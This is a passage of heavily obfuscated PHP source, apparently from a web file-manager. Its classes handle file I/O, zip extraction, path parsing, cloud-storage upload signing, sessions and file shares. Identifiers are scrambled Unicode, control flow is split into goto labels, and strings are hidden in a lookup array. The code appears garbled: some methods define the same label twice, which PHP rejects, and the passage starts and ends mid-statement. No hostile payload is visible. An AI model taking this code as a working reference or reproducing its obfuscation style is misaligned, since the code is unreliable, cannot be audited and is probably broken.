$this->hashMd5($Eԙ) . $C뻝; } $Aҍ = $aʇތ[33]; $c呡 = intval($C뻝 / $eț); goto D; D: } public function getContent($a߄) { $a߄ = $this->iconvSystem($a߄); return file_get_contents($a߄); } public function setContent($C, $fΆ􃆼 = '') { $C = $this->iconvSystem($C); @file_put_contents($C, $fΆ􃆼, LOCK_EX); clearstatcache(); return strlen($fΆ􃆼) == filesize($C); } public function fileSubstr($FⲘ, $Aԑ썱 = 0, $c = false) { goto C; Eݗ: fseek($f͡ݨұ, $Aԑ썱); $C = fread($f͡ݨұ, $c); fclose($f͡ݨұ); goto c诉; c诉: return $C; goto Bǟ֗; c: if ($c <= 0) { return $cᑸ[33]; } $f͡ݨұ = fopen($FⲘ, $cᑸ[1145]); if (!$f͡ݨұ) { return !1; } goto Eݗ; C: $cᑸ =& $_SERVER[ԥ]; $FⲘ = $this->iconvSystem($FⲘ); if ($c === !1) { $c = $this->size($FⲘ); } goto c; Bǟ֗: } public function upload($dٳ, $f, $a襫 = false, $Dى = REPEAT_REPLACE) { $Dܘ = $this->copyFile($f, $dٳ); return $Dܘ ? $this->getPathOuter($dٳ) : !1; } public function download($Fʮ, $d) { return $this->iconvSystem($Fʮ); } } goto Cʞ; f녻: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $eԈ; if (!$eԈ) { $E咘 = IO::init($_SERVER[ԥ][8]); } return $E咘; } private static function iconvSystem($b얔) { return self::local()->iconvSystem($b얔); } private static function iconvApp($b뒐) { return self::local()->iconvApp($b뒐); } public static function zip($fпъ, $EҐ = "\x7a\x69\160", $E = '', $a = REPEAT_RENAME) { goto bٻ; b: if ($E || !$CД) { if ($CД && strstr($CД, TEMP_FILES)) { $C͐ = $b = array(); recursion_dir($cÞ, $C͐, $b, 0); foreach ($C͐ as $Aᙃ) { del_dir($Aᙃ); } foreach ($b as $dʊê) { if ($dʊê == $E) { continue; } del_file($dʊê); } } return $eߍ; } $eͨ = self::pathFather($Bؿ[$bЩ[75]]); $dߗ = self::move($eߍ, $eͨ, $a); goto c؏; cȵ: $CД = !1; if (!$E && $Aȼ->getType() == $bЩ[101]) { $b = self::zipFileList($fпъ); } else { $CД = $E ? $E : TEMP_FILES . $bЩ[1008] . time() . rand_string(8) . $bЩ[8]; mk_dir($CД); $b = self::zipFileList($fпъ, $CД); } $fܩ = $Bؿ[$bЩ[28]]; goto Cղ; Cղ: if (count($b) > 1) { $C䎵 = IO::info(IO::pathFather($Bؿ[$bЩ[75]])); $fܩ = $C䎵[$bЩ[28]]; } $cÞ = $CД; if (!$cÞ) { $cÞ = get_path_father($Bؿ[$bЩ[75]]); $D謬 = IO::info($cÞ); if (!$D謬[$bЩ[185]]) { show_json(LNG($bЩ[1009]), !1); } } goto bͳ; c؏: if (!$dߗ) { del_dir($CД); show_json(LNG($bЩ[1010]), !1); } del_dir($CД); return $dߗ; goto A; bͳ: $eߍ = $cÞ . $fܩ . $bЩ[91] . $EҐ; $eߍ = get_filename_auto($eߍ, $bЩ[33], $a); $E = self::iconvSystem($eߍ); goto A҈; A҈: foreach ($b as $A => $c˫) { $b[$A] = self::iconvSystem($c˫); } KodArchive::create($E, $b); if (!IO::exist($eߍ)) { if ($CД) { del_dir($CД); } show_json(LNG($bЩ[1010]), !1); } goto b; bٻ: $bЩ =& $_SERVER[ԥ]; $Aȼ = self::init($fпъ[0][$bЩ[75]]); $Bؿ = self::info($fпъ[0][$bЩ[75]]); goto cȵ; A: } public static function unzip($eǤ, $c֫Ʌ = "\162\x65\x70\x6c\141\x63\145") { goto Bڏ; b: mk_dir($c); $A΢ = self::fileExt($aѝ); $a֧ = $c . $bɃ[91] . $A΢; goto e箙; DŬ: return !0; goto b; cޅۍŹ: $F¬ = self::tmpFileName($aѝ); $c = TEMP_FILES . $F¬; del_dir($c); goto b; B򉦠: foreach ($EȐ as $eڨ) { $eڨ = self::iconvApp($eڨ); self::move($eڨ, $C, $c֫Ʌ); } del_dir($c); if (!$b) { del_file($a֧); } goto DŬ; e箙: if (!@file_exists(self::iconvSystem($a֧))) { $b = self::localFilePath($DŽ, $A΢); $a֧ = $b ? $b : parent::download($DŽ, $a֧); } $a֧ = self::iconvSystem($a֧); $Eֿ = isset($eǤ[$bɃ[1013]]) ? $eǤ[$bɃ[1013]] : $bɃ[1014]; goto CԐ; CԐ: $b = KodArchive::extract($a֧, $c . $bɃ[8], $Eֿ); self::archiveExt(); if (!$b[$bɃ[1015]]) { show_json($bɃ[1016] . $b[$bɃ[1017]], !1); } goto cߣ̚; A惛: if (!($aѝ = parent::info($DŽ))) { show_json(LNG($bɃ[1012]), !1); } if (!($bޏ = parent::infoFull($C))) { $C = parent::mkdir($C); $bޏ = array($bɃ[75] => $C); } else { if (isset($bޏ[$bɃ[365]]) && trim($bޏ[$bɃ[75]], $bɃ[8]) != trim($C, $bɃ[8])) { $fȒ = KodIO::make($bޏ[$bɃ[457]]); $a樂 = parent::fileNameAuto($fȒ, $bޏ[$bɃ[28]], REPEAT_RENAME_FOLDER, !0); $C = parent::mkdir($fȒ . $a樂); $bޏ = array($bɃ[75] => $C); } } $C = $bޏ[$bɃ[75]]; goto cޅۍŹ; Bڏ: $bɃ =& $_SERVER[ԥ]; $DŽ = $eǤ[$bɃ[75]]; $C = $eǤ[$bɃ[1011]]; goto A惛; cߣ̚: Hook::trigger($bɃ[1018], $c); recursion_dir($c, $a, $c, 0); $EȐ = array_merge($a, $c); goto B򉦠; b: } public static function unzipList($Aʒޛ) { goto A; e墹ɛ: if (isset($fꋪ)) { $E̫ = array($fꋪ[$B؋[75]], $fꋪ[$B؋[1019]], $fꋪ[$B؋[28]]); $A = md5(implode($B؋[70], $E̫)) . $B؋[91] . get_path_ext($fꋪ[$B؋[28]]); } else { $E̫ = array($Aڲߤ[$B؋[28]], $Aڲߤ[$B؋[75]], $Aڲߤ[$B؋[77]]); $A = md5(implode($B؋[70], $E̫)) . $B؋[91] . $bë; } if ($fƱ == -1) { $f = IO_PATH_SYSTEM_TEMP . "\x7a\x69\x70\126\x69\145\167\57{$e}\x2f{$A}\x2e\x6c\157\147"; $a = self::infoFull($f); if ($a) { $f = $a[$B؋[75]]; $E͜ڐ = self::getContent($f); if ($E͜ڐ) { $b = json_decode($E͜ڐ, !0); if (count($b) >= $dѶ) { show_json(sprintf(LNG($B؋[1021]), count($b)), !1); } return $b; } } else { $f = self::mkfile($f); } } $e = TEMP_FILES . $e; goto D̈́; cņ: $b = json_encode($A[$B؋[1017]]); self::setContent($f, $b); if (count($A[$B؋[1017]]) >= $dѶ) { show_json(sprintf(LNG($B؋[1021]), count($A[$B؋[1017]])), !1); } goto B§; B§: return $A[$B؋[1017]]; goto aш; A: $B؋ =& $_SERVER[ԥ]; $Bՙͻ = $Aʒޛ[$B؋[75]]; $fƱ = isset($Aʒޛ[$B؋[1019]]) ? $Aʒޛ[$B؋[1019]] : -1; goto Dݚ; Dݚ: $dѶ = 50000; if (request_url_safe($Bՙͻ)) { $fꋪ = parse_url_query($Bՙͻ); if (!isset($fꋪ[$B؋[75]])) { show_json($B؋[1020], !1); } } $Bƛ = isset($fꋪ) ? $fꋪ[$B؋[75]] : $Bՙͻ; goto A; Cڇ­: $A = self::iconvSystem($A); if ($fƱ >= 0) { $d󧄻 = isset($Aʒޛ[$B؋[1023]]) ? $Aʒޛ[$B؋[1023]] : !1; $Cڄ = isset($Aʒޛ[$B؋[28]]) ? $Aʒޛ[$B؋[28]] : $B؋[33]; KodArchive::filePreview($A, $fƱ, $d󧄻, $Cڄ); self::archiveExt(); die; } $A = KodArchive::listContent($A); goto EӢʢ; A: $Aڲߤ = self::info($Bƛ); $bë = self::fileExt($Aڲߤ); $e = self::tmpFileName($Aڲߤ); goto e墹ɛ; D̈́: if (!is_dir($e)) { mk_dir($e); } $A = $e . $B؋[8] . $A; if (!@file_exists(self::iconvSystem($A))) { if (isset($fꋪ)) { url_request($Bՙͻ, $B؋[1022], $A); } else { $Eָ = self::localFilePath($Bՙͻ, $bë); $A = $Eָ ? $Eָ : self::download($Bՙͻ, $A); } } goto Cڇ­; EӢʢ: self::archiveExt(); del_dir($e); if (!$A[$B؋[1015]]) { show_json($A[$B؋[1017]], !1); } goto cņ; aш: } private static function fileExt($Dͻɣ) { $B̲ۯ =& $_SERVER[ԥ]; $aΪץ = $Dͻɣ[$B̲ۯ[156]]; if ($aΪץ == $B̲ۯ[1024]) { $Fծ = $B̲ۯ[1025]; if (substr($Dͻɣ[$B̲ۯ[28]], -strlen($Fծ)) == $Fծ) { $aΪץ = $B̲ۯ[1026]; } } self::archiveExt($aΪץ); return $aΪץ; } private static function zipFileList($DØ, $c = false) { $D։ =& $_SERVER[ԥ]; $f˥˹ = array(); foreach ($DØ as $eݼ) { $aȺ܎ = $eݼ[$D։[75]]; if ($c) { $aȺ܎ = self::copy($eݼ[$D։[75]], $c, $D։[736]); } if ($aȺ܎ && self::local()->exist($aȺ܎)) { $f˥˹[$eݼ[$D։[75]]] = $aȺ܎; } } if (!empty($f˥˹)) { return array_values($f˥˹); } show_json(LNG($D։[1027]), !1); } public static function tmpFileName($f렃) { $F =& $_SERVER[ԥ]; $B = array($f렃[$F[28]], $f렃[$F[75]], $f렃[$F[77]], $f렃[$F[455]]); return md5(implode($F[70], $B)); } private static function localFilePath($Fϥ, $d؏) { goto A; d˔: if ($a == $f[101] || $a == $f[1031]) { if (!$cƝ쾙->exist($cƝ쾙->path)) { show_json(LNG($f[100]), !1); } return $cƝ쾙->path; } return !1; goto C寛އ; D蒨: if ($EІ[$f[29]] == KodIO::KOD_SOURCE) { $F = Model($f[744])->fileInfoGet(KodIO::sourceID($Fϥ)); if (!$F[$f[75]]) { show_json($f[1030], !1); } $Fϥ = $F[$f[75]]; } $cƝ쾙 = self::init($Fϥ); $a = $cƝ쾙->getType(); goto d˔; A: $f =& $_SERVER[ԥ]; if ($d؏ == $f[1028] && strtoupper(substr(PHP_OS, 0, 3)) == $f[1029]) { return !1; } $EІ = KodIO::parse($Fϥ); goto D蒨; C寛އ: } private static function archiveExt($B = '') { $GLOBALS[$_SERVER[ԥ][1032]] = $B; } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\x75\162\143\x65\x7d"; const KOD_USER_RECYCLE = "\173\x75\x73\x65\x72\x52\x65\x63\171\143\154\x65\x7d"; const KOD_USER_FAV = "\x7b\x75\163\x65\x72\x46\x61\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\163\145\x72\106\x69\154\145\x54\x61\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\x65\162\x46\151\154\x65\x54\171\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\x6f\165\160\122\157\157\164\123\x65\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\x65\x72\x53\x68\141\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\x65\162\123\x68\x61\x72\145\114\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\141\162\145\x54\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\141\x72\x65\x49\164\x65\x6d\175"; const KOD_SHARE_LINK = "\x7b\163\x68\x61\x72\145\111\164\x65\155\114\x69\x6e\153\x7d"; const KOD_SEARCH = "\173\163\x65\x61\162\x63\150\175"; const KOD_BLOCK = "\x7b\x62\154\x6f\x63\x6b\x7d"; const KOD_IO = "\173\x69\157\175"; const KOD_USER_RECENT = "\x7b\x75\x73\145\162\122\x65\156\143\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\151\166\145\162\x7d"; public static function typeList() { $E =& $_SERVER[ԥ]; return array($E[1033] => self::KOD_SOURCE, $E[1034] => self::KOD_USER_RECYCLE, $E[1035] => self::KOD_USER_FAV, $E[1036] => self::KOD_USER_FILE_TAG, $E[1037] => self::KOD_USER_FILE_TYPE, $E[1038] => self::KOD_GROUP_ROOT_SELF, $E[1039] => self::KOD_USER_SHARE, $E[1040] => self::KOD_USER_SHARE_LINK, $E[1041] => self::KOD_USER_SHARE_TO_ME, $E[1042] => self::KOD_SHARE_ITEM, $E[1043] => self::KOD_SHARE_LINK, $E[1044] => self::KOD_SEARCH, $E[1045] => self::KOD_BLOCK, $E[1046] => self::KOD_IO, $E[1047] => self::KOD_USER_RECENT, $E[1048] => self::KOD_USER_DRIVER); } public static function parse($eڄ) { goto c; cڬ: preg_match($a[1049], $eڄ, $c); $Eǲ = array($a[384] => !1, $a[1050] => !1, $a[381] => !1, $a[75] => $eڄ, $a[995] => !1, $a[994] => $a[33]); if (is_array($c) && count($c) == 5) { $D = $a[1051] . $c[2] . $a[311]; if (in_array($D, $b瞳ƒ)) { $Eǲ[$a[995]] = $c[1]; $Eǲ[$a[29]] = $D; $Eǲ[$a[1052]] = substr($D, 1, -1); $Eǲ[$a[363]] = $c[3]; } $Eǲ[$a[994]] = $c[4]; } goto Dʠ; Dʠ: $Dޞ = array($a[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Eǲ[$a[1053]] = in_array($Eǲ[$a[29]], $Dޞ); return $Eǲ; goto aˍ; c: $a =& $_SERVER[ԥ]; $eڄ = self::clear($eڄ); $b瞳ƒ = array_values(self::typeList()); goto cڬ; aˍ: } public static function clear($cȺ) { goto DԣҠ; cˆ: if ($cȺ == $fވ[8]) { return $fވ[8]; } $cȺ = rtrim($cȺ, $fވ[8]); return $cȺ; goto Bߕ; Fի: if (substr($cȺ, 0, 3) == $fވ[1055]) { $cȺ = substr($cȺ, 3); } while (strstr($cȺ, $b݇)) { $cȺ = str_replace($b݇, $fވ[8], $cȺ); } $cȺ = preg_replace($fވ[1056], $fވ[8], $cȺ); goto cˆ; DԣҠ: $fވ =& $_SERVER[ԥ]; $cȺ = str_replace($fވ[93], $fވ[8], $cȺ); $b݇ = $fވ[1054]; goto Fի; Bߕ: } public static function sourceID($Eɚ) { $D㓠 =& $_SERVER[ԥ]; $Bƅ = self::parse($Eɚ); if ($Bƅ[$D㓠[29]] !== self::KOD_SOURCE) { show_json(LNG($D㓠[1057]), !1); } return $Bƅ[$D㓠[363]]; } public static function make($cڰ) { if (!$cڰ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($cڰ)); } public static function makeShare($C҂, $d۰) { return self::makePath(self::KOD_SHARE_ITEM, $C҂, $d۰); } public static function makeFileTypePath($Bѭ) { return self::makePath(self::KOD_USER_FILE_TYPE, $Bѭ); } public static function makeFileTagPath($fԂ) { return self::makePath(self::KOD_USER_FILE_TAG, $fԂ); } public static function makePath($cΫ, $Eɇ = '', $c = '') { $D㷑ه =& $_SERVER[ԥ]; $E = substr($cΫ, 1, -1); $aבʝ = $D㷑ه[1058] . $E . $D㷑ه[1059] . $Eɇ . $D㷑ه[1060]; $aבʝ = $c ? $aבʝ . $c . $D㷑ه[8] : $aבʝ; return $aבʝ; } public static function hashPath($D) { $a =& $_SERVER[ԥ]; $C׭ = is_array($D) ? $D : IO::info($D); $F߳ = _get($C׭, $a[1061], $a[33]); if (!$F߳) { $CԊѷ = KodIO::parse($C׭[$a[75]]); if (!$CԊѷ[$a[29]]) { $F߳ = IO::hashSimple($C׭[$a[75]]); } } if (!$F߳) { $F߳ = md5($C׭[$a[75]] . $C׭[$a[77]] . $C׭[$a[106]]); } return $F߳; } public static function initSystemPath() { $a =& $_SERVER[ԥ]; if (defined($a[1062])) { return; } define($a[1062], self::systemPath($a[1063])); define($a[1064], self::systemPath($a[1065])); define($a[1066], self::systemPath($a[1067])); define($a[1068], self::systemPath($a[1069])); } private static function systemPath($FĊ) { goto Eὺ; Eὺ: $f͟ =& $_SERVER[ԥ]; $f = $f͟[1070] . ucfirst($FĊ); $F = Model($f͟[1071])->get($f); goto eӶ; aэ̳: return $F; goto A; eӶ: if ($F) { return $F; } if ($FĊ == $f͟[1063]) { $F = self::make(Model($f͟[744])->systemRootPathAdd($f͟[1072])); } else { $F = self::systemPath($f͟[1063]); $A = self::sourceID($F); $F = self::make(Model($f͟[744])->mkdir($A, $FĊ)); } Model($f͟[1071])->set($f, $F); goto aэ̳; A: } public static function systemFolder($F) { $Cޛ = IO_PATH_SYSTEM_SOURCE . $F; $f = Cache::get($Cޛ); if (!$f) { $Dދ = IO::infoFull($Cޛ); if (!$Dދ) { $f = IO::mkdir($Cޛ, REPEAT_SKIP); } else { $f = $Dދ[$_SERVER[ԥ][75]]; } Cache::set($Cޛ, $f, 3600 * 10); } return $f; } public static function defaultDriver() { return Model($_SERVER[ԥ][688])->defaultDriver(); } public static function defaultIO() { $aɑ =& $_SERVER[ԥ]; $f = self::defaultDriver(); return $aɑ[1073] . $f[$aɑ[363]] . $aɑ[1060]; } public static function fileTypeList() { $Cćݾ =& $_SERVER[ԥ]; $cՂߧ = $GLOBALS[$Cćݾ[6]][$Cćݾ[1074]]; foreach ($cՂߧ as $D߅ڱ => $aퟥ) { $Bޞ = $Cćݾ[1075] . $D߅ڱ; $cǤ = LNG($Bޞ); if ($Bޞ != $cǤ) { $cՂߧ[$D߅ڱ][$Cćݾ[28]] = $cǤ; } } return $cՂߧ; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($D) { parent::__construct($D); $this->signatureVersion($_SERVER[ԥ][196]); } public function uploadFormData($Aե, $fڍї = 3600) { goto fߍӋ; DӶ: $CÇ婂 = sha1($a); $d򸓽 = hash_hmac($Fϳ[214], $CÇ婂, $c÷); $b¸ = array($Fϳ[1080] => $F􏫹, $Fϳ[1084] => $Eټ, $Fϳ[1088] => base64_encode($a), $Fϳ[1085] => $Dƺ, $Fϳ[1086] => $this->accessKey, $Fϳ[1089] => $F, $Fϳ[1090] => $d򸓽, $Fϳ[165] => $this->getHost()); goto E紐; A؂: $a = array($Fϳ[1078] => $a, $Fϳ[1079] => array(array($Fϳ[1080] => $F􏫹), array($Fϳ[1081] => $this->bucket), array($Fϳ[1082], $Fϳ[1083], $Fϳ[33]), array($Fϳ[1084] => $Eټ), array($Fϳ[1085] => $Dƺ), array($Fϳ[1086] => $this->accessKey), array($Fϳ[1087] => $F))); $a = json_encode($a); $c÷ = hash_hmac($Fϳ[214], $F, $this->secret); goto DӶ; E紐: return $b¸; goto c梅; b٠ō: $Eټ = $Fϳ[1076]; $a = gmdate($Fϳ[1077], time() + $fڍї); $F = (string) time() . $Fϳ[67] . (string) (time() + $fڍї); goto A؂; fߍӋ: $Fϳ =& $_SERVER[ԥ]; $F􏫹 = $Fϳ[181]; $Dƺ = $Fϳ[214]; goto b٠ō; c梅: } public function fileOutLink($Fѻ) { $aǤ =& $_SERVER[ԥ]; if (substr($Fѻ, 0, 7) == $aǤ[1091]) { $Fѻ = $aǤ[1092] . substr($Fѻ, 7); } header($aǤ[152] . $Fѻ); die; } } goto bԨ; E׶: class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\x74\145\155\x5f\x73\145\x73\x73\151\157\x6e"; public function get($b) { $F݋ =& $_SERVER[ԥ]; $Dެڂ = $this->where(array($F݋[2167] => $b))->find(); if (!is_array($Dެڂ)) { return !1; } return $Dެڂ[$F݋[676]]; } public function set($fᗊ螧, $Cڰ, $Cԏ = 3600) { $FѮ =& $_SERVER[ԥ]; $B = array($FѮ[2167] => $fᗊ螧, $FѮ[2096] => $Cڰ, $FѮ[2168] => $Cԏ + time()); if (Session::get($FѮ[2169])) { $B[$FѮ[1404]] = Session::get($FѮ[2169]); } else { $B[$FѮ[1404]] = 0; } if ($this->get($fᗊ螧)) { return $this->where(array($FѮ[2167] => $fᗊ螧))->save($B); } else { return $this->add($B, array(), !0); } } public function remove($BΥ) { return $this->where(array($_SERVER[ԥ][2167] => $BΥ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ԥ][2170] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\162\145"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\x79\124\151\155\145", "\164\151\155\145", "\x69\156\163\145\x72\164\54\165\x70\144\141\164\x65", "\146\165\156\x63\x74\x69\x6f\156"), array("\143\x72\x65\141\x74\145\x54\x69\x6d\x65", "\x74\151\155\x65", "\x69\156\163\145\x72\164", "\146\x75\x6e\x63\164\x69\x6f\x6e"), array("\157\160\164\151\x6f\156\163", '', "\151\x6e\x73\x65\x72\164\x2c\x75\x70\x64\x61\164\x65\x2c\163\145\154\x65\143\x74", "\152\x73\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($A) { $aބ =& $_SERVER[ԥ]; $Cޞ = isset($A[0]) ? $A[0] : !1; return array($aބ[2171] => array(USER_ID, $aބ[2172]), $aބ[2134] => array($Cޞ, $aބ[2173])); } protected function listSimple() { $B = array($_SERVER[ԥ][1404] => USER_ID); $B㹘 = $this->field($this->fieldList)->where($B)->select(); return $B㹘 ? $B㹘 : array(); } protected function getInfo($b̢, $B = false) { $Aǅ =& $_SERVER[ԥ]; if ($B) { return $this->_getShareInfo(array($Aǅ[437] => $b̢)); } $Dʷ = $this->cacheFunctionGet($Aǅ[2174], $b̢); return $Dʷ; } public function getInfoByHash($e҇) { return $this->_getShareInfo(array($_SERVER[ԥ][439] => $e҇)); } public function getInfoByPath($E) { $cɄ =& $_SERVER[ԥ]; $d = array($cɄ[1404] => USER_ID, $cɄ[365] => $E); return $this->_getShareInfo($d); } public function getInfoBySourcePath($fԊ) { $D =& $_SERVER[ԥ]; $A۰ = array($D[1404] => USER_ID, $D[1001] => $fԊ); return $this->_getShareInfo($A۰); } private function _getShareInfo($d،ט) { goto C; C: $Cԑ =& $_SERVER[ԥ]; $c֩ݵ = $this->where($d،ט)->find(); if (!$c֩ݵ) { return !1; } goto c; c: $d،ט = array($Cԑ[437] => $c֩ݵ[$Cԑ[437]]); $Eۜ = $Cԑ[2175]; $Cҍ = Model($Cԑ[533])->order($Cԑ[363])->field($Eۜ)->where($d،ט)->select(); goto CͲ; CͲ: if ($c֩ݵ[$Cԑ[365]] == $Cԑ[464]) { $c֩ݵ[$Cԑ[387]] = IO::info($c֩ݵ[$Cԑ[1001]]); } else { $c֩ݵ[$Cԑ[387]] = Model($Cԑ[1093])->pathInfo($c֩ݵ[$Cԑ[365]]); } $c֩ݵ[$Cԑ[2176]] = $Cҍ; return $c֩ݵ; goto d塽; d塽: } protected function getInfoAuth($E췆) { $B =& $_SERVER[ԥ]; $Bƍލ = $this->getInfo($E췆); $Bƍލ[$B[372]] = Model($B[450])->authMake($Bƍލ[$B[2176]]); return $Bƍލ; } protected function listData($f醺 = null, $AƬٷ = 300) { $e쬏ᵊ =& $_SERVER[ԥ]; $eİ = array(array($e쬏ᵊ[442] => array($e쬏ᵊ[911], 0), $e쬏ᵊ[444] => array($e쬏ᵊ[911], 0), $e쬏ᵊ[2177] => $e쬏ᵊ[2146])); if ($f醺 == $e쬏ᵊ[1833]) { $eİ = array($e쬏ᵊ[442] => 1); } else { if ($f醺 == $e쬏ᵊ[990]) { $eİ = array($e쬏ᵊ[444] => 1); } } $eİ[$e쬏ᵊ[1404]] = USER_ID; $Aٓ = $this->where($eİ)->selectPage($AƬٷ); return $Aٓ; } protected function listToMe($cݻ = 300) { goto dֳ; AՖ: $C = array_to_keyvalue_group($A⋙[$C̶ي[350]], $C̶ي[437]); if (!$C) { return $A⋙; } $BĨͺ = $C̶ي[2179]; goto Dуݾ; CۍĽ: $d = array($C̶ي[517] => SourceModel::TYPE_USER, $C̶ي[452] => USER_ID); if ($Bў) { $d = array(array($C̶ي[517] => SourceModel::TYPE_USER, $C̶ي[452] => USER_ID), array($C̶ي[517] => SourceModel::TYPE_GROUP, $C̶ي[452] => array($C̶ي[7], $Bў)), $C̶ي[2177] => $C̶ي[2146]); } $A⋙ = Model($C̶ي[533])->where($d)->selectPage($cݻ); goto AՖ; dֳ: $C̶ي =& $_SERVER[ԥ]; $B䟒 = Session::get($C̶ي[2178]); $Bў = array_to_keyvalue($B䟒, $C̶ي[33], $C̶ي[2066]); goto CۍĽ; Dуݾ: $d = array($C̶ي[437] => array($C̶ي[380], array_keys($C))); $fɚ = $this->field($BĨͺ)->where($d)->select(); foreach ($fɚ as $aٙԺ => &$e¥) { $e¥[$C̶ي[2176]] = $C[$e¥[$C̶ي[437]]]; } goto f벥; f벥: $c = array($C̶ي[2180] => $fɚ, $C̶ي[2181] => $A⋙[$C̶ي[347]]); return $c; goto f; f: } protected function shareAdd($F, $A欈) { $F뉧̠ =& $_SERVER[ԥ]; $d = $this->_addShareData($F, $A欈); if (!empty($A欈[$F뉧̠[2182]])) { $this->_shareAuthSet($d, $A欈[$F뉧̠[2182]]); } $this->shareEventAdd($F, $A欈, $F뉧̠[993]); return $d; } private function shareEventAdd($E䄔, $D͒, $A = "\141\x64\144") { goto Eˈڠ; Eˈڠ: $d =& $_SERVER[ԥ]; if ($A == $d[993]) { if ($D͒[$d[442]] == $d[83]) { Model($d[501])->eventShare($E䄔, $d[2183]); } if ($D͒[$d[444]] == $d[83]) { Model($d[501])->eventShare($E䄔, $d[2184]); } return; } $c㮰 = $this->getInfoByPath($E䄔); goto Cʃٳ; AͲ: if ($c㮰[$d[444]] == $d[464] && $D͒[$d[444]] == $d[83]) { $AވҺ = $d[2184]; } if ($c㮰[$d[444]] == $d[83] && $D͒[$d[444]] == $d[464]) { $AވҺ = $d[2187]; } Model($d[501])->eventShare($E䄔, $AވҺ); goto FԕƆ; Cʃٳ: $AވҺ = $d[2185]; if ($c㮰[$d[442]] == $d[464] && $D͒[$d[442]] == $d[83]) { $AވҺ = $d[2183]; } if ($c㮰[$d[442]] == $d[83] && $D͒[$d[442]] == $d[464]) { $AވҺ = $d[2186]; } goto AͲ; FԕƆ: return; goto FԊ㰏; FԊ㰏: } private function _addShareData($eގۆ, $bƤ = array()) { goto fÃ; cȱ: $b܆ = $this->add($b른); $f = array($f[439] => short_id($b܆)); $this->where(array($f[436] => $b܆))->save($f); goto d; fÃ: $f =& $_SERVER[ԥ]; $bԇ = array($f[379] => $eގۆ, $f[1395] => USER_ID); if ($eގۆ == 0) { $bԇ = array($f[2188] => $bƤ[$f[1001]], $f[1395] => USER_ID); } goto BǑ; BǑ: if ($c = $this->where($bԇ)->find()) { return $c[$f[437]]; } if ($eގۆ == 0) { $E = array($f[28] => get_path_this($bƤ[$f[75]])); } else { $E = Model($f[744])->sourceInfo($eގۆ); if (!$E) { return !1; } } if (!$bƤ[$f[1312]]) { $bƤ[$f[1312]] = $E[$f[28]]; } goto a±ꛛ; a±ꛛ: $b른 = array($f[1395] => USER_ID, $f[379] => $eގۆ, $f[1312] => $f[33], $f[442] => 0, $f[444] => 0, $f[1001] => $f[33], $f[291] => $f[33], $f[787] => $f[33], $f[2189] => 0, $f[2190] => 0, $f[687] => 0, $f[2191] => $f[33], $f[439] => $f[33]); $cصȝ = explode($f[47], $f[2192]); foreach ($cصȝ as $EݣĢ) { if (!isset($bƤ[$EݣĢ])) { continue; } $b른[$EݣĢ] = $bƤ[$EݣĢ]; } goto cȱ; d: return $b܆; goto Fﾏ֥; Fﾏ֥: } private function _shareAuthSet($CؐÒ, $aجϛ) { goto f׋; bʊ־: $e->where(array($aʛ[437] => $CؐÒ))->delete(); $c = array(); foreach ($aجϛ as $bъ) { $b̆ = SourceModel::TYPE_USER; if ($bъ[$aʛ[367]] == SourceModel::TYPE_GROUP) { $b̆ = SourceModel::TYPE_GROUP; } $fѴ = array($aʛ[437] => $CؐÒ, $aʛ[367] => $b̆, $aʛ[452] => intval($bъ[$aʛ[452]]), $aʛ[2194] => 0, $aʛ[2195] => -1); if ($bъ[$aʛ[2194]]) { $fѴ[$aʛ[2194]] = $bъ[$aʛ[2194]]; } else { if ($bъ[$aʛ[2195]]) { $fѴ[$aʛ[2195]] = $bъ[$aʛ[2195]]; } } $c[] = $fѴ; } goto A; A: return $e->addAll($c, array(), !0); goto B; f׋: $aʛ =& $_SERVER[ԥ]; if (!is_array($aجϛ)) { return !1; } $e = Model($aʛ[2193]); goto bʊ־; B: } public function numViewAdd($cϖ̎) { $E÷ա =& $_SERVER[ԥ]; $Bχ쳝 = array($E÷ա[436] => $cϖ̎); $this->where($Bχ쳝)->setAdd($E÷ա[2189]); } public function numDownloadAdd($C) { $A퇝 =& $_SERVER[ԥ]; $aᰬ = array($A퇝[436] => $C); $this->where($aᰬ)->setAdd($A퇝[2190]); } protected function shareEdit($f, $bȞԡ) { goto B; d߂莂: $this->_checkLinkShare($bȞԡ, $Eޛ); $d܄ = array(); $DӃ = explode($c[47], $c[2196]); goto Bʯ̠; Bʯ̠: foreach ($DӃ as $c) { if (!array_key_exists($c, $bȞԡ)) { continue; } $d܄[$c] = $bȞԡ[$c]; } $this->shareEventAdd($Eޛ[$c[365]], $bȞԡ, $c[2034]); $this->where(array($c[436] => $f))->save($d܄); goto aЂԚ; aЂԚ: if (isset($bȞԡ[$c[2182]])) { $this->_shareAuthSet($f, $bȞԡ[$c[2182]]); } return !0; goto b; B: $c =& $_SERVER[ԥ]; $Eޛ = $this->getInfo($f); if (!$Eޛ) { return !1; } goto d߂莂; b: } private function _checkLinkShare($e, $f􌶸) { goto f匃; FÈƃ: if ($f􌶸[$aϑ[387]][$aϑ[29]] != $aϑ[163]) { $a˜ = $this->_folderReport($B˳Ũ); if (!$a˜) { return; } show_json(LNG($aϑ[2197]) . $aϑ[2198] . $a˜, !1); } $fĭݦ = Model($aϑ[744])->fileInfoGet($f􌶸[$aϑ[387]][$aϑ[365]]); if (!$fĭݦ) { return; } goto B▉; B▉: $d = $this->shareFileMeta($fĭݦ[$aϑ[415]]); if (isset($d[$aϑ[355]]) && $d[$aϑ[355]] == $aϑ[83]) { show_json(LNG($aϑ[2199]), !1); } goto 